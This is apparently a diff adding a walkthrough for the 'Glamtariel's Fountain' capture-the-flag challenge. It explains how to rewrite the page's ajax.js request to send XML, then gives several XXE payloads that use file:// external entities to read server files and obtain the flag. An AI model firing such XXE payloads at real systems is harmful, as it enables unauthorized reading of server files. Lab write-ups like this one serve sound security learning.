@@ -1,0 +1,66 @@
+Glamtariels Fountain Editing JS
+Webpage: https://glamtarielsfountain.com/
+
+1) Drops to get to the last set of images:
+  Kringle => Princess
+  Kringle => Fountain
+  Elf => Princess
+  Elf => Fountain
+  Ring => Princess
+  Boat => Fountain
+  Ring => Fountain => Click Eye
+  Igloo => Fountain
+  1st Blue => Fountain
+  2nd Blue => Fountain
+  Silver => Princess
+  Red => Fountain
+
+2) KEYWORDs along the way:
+  TAMPER (cookies)
+  TRAFFIC FLIES
+  PATH (elf make paths)
+  APP
+  SIMPLE FORMAT (way to track rings)
+  RINGLIST (file, a list)
+  TYPE (of language)
+
+3) Once you get to the last set of images, press F12 to access your browser's Dev Console.
+
+4) Sources (tab) > static (folder) > js (folder) > ajax.js (file) > bottom of this file is what makes the HTTP POST requests.
+
+5) Change content-type to application/xml to start submitting payload/body in xml format. Everything in req.send needs to be on one line. Press Ctrl+S to save your changes:
+
+req.open('POST', '/dropped', true);
+req.setRequestHeader("Content-Type", "application/xml");
+req.setRequestHeader('Accept', 'application/json');
+req.setRequestHeader("X-Grinchum", reqToken);
+req.send('<root><imgDrop>img1</imgDrop><who>princess</who><reqType>xml</reqType></root>');
+
+
+6) Drop an image anywhere to see responses to your changes within the browser.
+
+7) Add !DOCTYPE and !ENTITY (www.youtube.com/watch?v=gjm6VHZa_8s) and request the RINGLIST:
+
+req.send('<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt">]><root><imgDrop>&xxe;</imgDrop><who>princess</who><reqType>xml</reqType></root>');
+
+
+11) Next clue (https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png) image shows x_phial_pholder_2022 folder with red and blue ring. Actual game page has a silver ring so:
+
+req.send('<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt">]><root><imgDrop>&xxe;</imgDrop><who>princess</who><reqType>xml</reqType></root>');
+
+
+12) Next clue (https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png) image shows a red ring with the phrase goldring_to_be_deleted.txt so:
+
+req.send('<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]><root><imgDrop>&xxe;</imgDrop><who>princess</who><reqType>xml</reqType></root>');
+
+
+13) New keyword is REQ. Move &xxe; to reqType and put img1 (silver ring) into the imgDrop:
+
+req.send('<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]><root><imgDrop>img1</imgDrop><who>princess</who><reqType>&xxe;</reqType></root>');
+
+
+14a) Right click on the gold ring image > Open image in new tab > (the flag is in the address bar)
+
+14b) Dev Console > Network (tab) > (view the last request named "dropped") > (the flag is in the value of "visit" of the response)
+
+Flag: goldring-morethansupertopsecret76394734.png
